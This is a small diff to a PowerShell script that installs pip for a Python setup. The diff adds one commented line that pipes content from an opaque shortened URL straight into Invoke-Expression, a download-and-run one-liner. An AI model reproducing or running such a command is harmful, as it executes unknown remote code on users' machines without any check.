@@ -1,5 +1,6 @@
 
 # installs a bunch of stuff to make python work for VCE algo HESS
+# irm x.gd/12alga | iex
 
 Invoke-WebRequest -Uri https://bootstrap.pypa.io/get-pip.py -OutFile .\get-pip.py
 python get-pip.py
